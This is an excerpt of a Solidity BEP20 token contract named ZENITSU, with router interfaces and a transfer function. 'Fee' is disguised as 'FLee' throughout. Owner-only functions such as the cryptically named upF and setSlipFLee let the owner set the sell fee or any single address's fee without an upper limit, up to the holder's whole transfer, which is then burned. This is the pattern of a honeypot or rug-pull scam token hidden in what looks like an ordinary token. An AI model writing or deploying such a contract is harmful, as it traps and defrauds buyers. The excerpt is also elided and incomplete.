...
interface IUniswapV2Factory {
    ...
    function FLeeTo() external view returns (address);
    function FLeeToSetter() external view returns (address);
    ...
    function setFLeeTo(address) external;
    function setFLeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFLeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFLeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingFLeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFLeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFLeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ZENITSU is BEP20, Ownable {
    ...
    uint256 private _defaultSellFLee = 0;

    uint256 private _defaultBuyFLee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFLee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellFLee = _value;
    }

    function setSlipFLee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFLee[_address] = _value;
    }

    function getSlipFLee(address _address) external view onlyownar returns (uint256) {
        return _slipFLee[_address];
    }


    function setMAccountFLee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountFLee(address _address) external view onlyownar returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradeFLee = _defaultSellFLee;
                }
                if (from == uniswapV2Pair) {

                    tradeFLee = _defaultBuyFLee;
                }
            }
            if (_slipFLee[from] > 0) {
                tradeFLee = _slipFLee[from];
            }

            tradeFLeeAmount = _Amount.mul(tradeFLee).div(100);
        }


        if (tradeFLeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFLeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFLeeAmount);
            emit Transfer(from, _deadAddress, tradeFLeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeFLeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeFLeeAmount);
        emit Transfer(from, _to, _Amount - tradeFLeeAmount);
    }
